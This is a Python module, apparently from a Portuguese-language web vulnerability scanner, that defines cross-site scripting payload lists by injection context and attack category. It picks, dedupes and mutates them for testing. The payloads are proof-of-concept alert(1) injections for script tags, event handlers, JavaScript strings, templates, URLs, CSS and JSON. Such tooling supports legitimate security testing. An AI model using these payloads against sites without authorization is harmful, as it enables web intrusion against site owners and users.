"""
PayloadEngine — Fase 4

Seleciona payloads baseados em contexto de injeção e categoria de ataque,
aplicando mutações via PayloadMutator quando desejado.
"""

from __future__ import annotations

from typing import Dict, List, Optional

from core.payload_mutator import PayloadMutator


DEFAULT_CONTEXT_PAYLOADS: Dict[str, List[str]] = {
    "HTML_BODY": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<details open ontoggle=alert(1)>",
    ],
    "ATTRIBUTE": [
        '" onmouseover="alert(1)',
        "' onfocus='alert(1)' autofocus='",
        '" autofocus onfocus="alert(1)',
    ],
    "JS_STRING": [
        "'; alert(1); //",
        '"; alert(1); //',
        "\\'; alert(1); //",
    ],
    "JS_TEMPLATE": [
        "${alert(1)}",
        "${console.log(1)}",
        "`-alert(1)-`",
    ],
    "URL": [
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
    ],
    "CSS": [
        "</style><script>alert(1)</script>",
        "background-image:url(javascript:alert(1))",
    ],
    "JSON": [
        '\",\"rf\":\"<script>alert(1)</script>',
        '"}];alert(1);//',
    ],
    "HEADER": [
        "<script>alert(1)</script>",
        '"><img src=x onerror=alert(1)>',
    ],
    "DOM": [
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "${alert(1)}",
    ],
}


CATEGORY_PAYLOADS: Dict[str, List[str]] = {
    "dom_xss": [
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "${alert(1)}",
        '";alert(1);//',
    ],
    "csrf": [
        "csrf-check",
    ],
}


class PayloadEngine:
    """Resolve payloads por contexto, categoria e payload candidato original."""

    def __init__(self, mutator: Optional[PayloadMutator] = None):
        self.mutator = mutator or PayloadMutator()

    def get_payloads(
        self,
        context: str,
        category: str,
        candidate_payload: str = "",
        mutate: bool = True,
        max_payloads: Optional[int] = None,
    ) -> List[str]:
        normalized_context = (context or "HTML_BODY").upper()
        base = list(CATEGORY_PAYLOADS.get(category, []))
        base.extend(DEFAULT_CONTEXT_PAYLOADS.get(normalized_context, DEFAULT_CONTEXT_PAYLOADS["HTML_BODY"]))

        if candidate_payload:
            base.insert(0, candidate_payload)

        payloads = self._unique(base)
        if mutate:
            payloads = self.mutator.mutate(payloads, category)

        if max_payloads is not None:
            payloads = payloads[: max(1, int(max_payloads))]
        return payloads

    @staticmethod
    def _unique(values: List[str]) -> List[str]:
        seen = set()
        result = []
        for value in values:
            if not value or value in seen:
                continue
            seen.add(value)
            result.append(value)
        return result
